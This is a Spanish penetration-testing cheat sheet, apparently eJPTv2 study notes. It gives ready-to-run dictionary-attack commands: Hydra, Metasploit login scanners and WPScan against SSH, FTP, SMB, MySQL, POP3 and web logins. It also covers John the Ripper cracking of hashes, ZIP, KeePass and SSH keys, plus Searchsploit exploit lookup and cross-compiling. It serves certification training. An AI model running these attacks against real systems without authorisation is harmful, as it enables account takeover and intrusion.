# 🔐 PLAYBOOK 3 — FUERZA BRUTA Y CRACKING

> **Objetivo:** Descubrir credenciales válidas mediante ataques de diccionario.
> **Fuente:** Guia_eJPTv2_TFM — Carpetas 08, 10

---

## 3.1 — Hydra

### SSH
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <PASS> ssh://<TARGET_IP>
```

### FTP
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p <PASS> ftp://<TARGET_IP>
```

### SMB
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>
```

### MySQL
```bash
hydra -l <USER> -P <WORDLIST> mysql://<TARGET_IP>
```

### POP3
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> pop3
hydra -L usuarios.txt -P rockyou.txt <TARGET_IP> pop3
```

### Login Web (HTTP POST Form)
```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin.php:username=admin&password=^PASS^:Incorrect username or password."

hydra -t 64 -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -s <PORT> https-post-form "/session_login.cgi:username=^USER^&password=^PASS^:Login failed."

hydra -t 64 -L usuarios.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -s 8080 http-get
```

---

## 3.2 — Metasploit Brute Force

### FTP
```bash
use auxiliary/scanner/ftp/ftp_login
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <USER>
set RHOSTS <TARGET_IP>
run
```

### SSH
```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME <USER>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS <TARGET_IP>
run
```

### SMB / SAMBA
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set VERBOSE false
set SMBUser <USER>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 3.3 — WPScan (WordPress)
```bash
wpscan --url http://<TARGET_IP>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

---

## 3.4 — John The Ripper — Cracking

### Hash genérico
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
hashid <HASH>                                    # Identificar tipo de hash
john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
john --format=NT hashes.txt                      # Hashes NTLM
```

### Crackear ZIP
```bash
zip2john archivo.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Crackear KeePass (kdbx)
```bash
keepass2john archivo.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Crackear id_rsa (SSH key)
```bash
ssh2john id_rsa > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 3.5 — Searchsploit
```bash
searchsploit <TERM>
searchsploit -m <EXPLOIT_ID>           # Copiar exploit al directorio actual
searchsploit -c OpenSSH                # Case sensitive
searchsploit -t vsftpd                 # Solo título
searchsploit -e "Windows 7"           # Búsqueda exacta
searchsploit remote windows smb
searchsploit -w remote windows smb | grep -e "EternalBlue"   # URLs online
```

### Cross-Compiling exploits
```bash
# Windows x64
x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe
# Windows x86
i686-w64-mingw32-gcc exploit.c -o exploit32.exe
# Linux
gcc -pthread exploit.c -o exploit -lcrypt
```
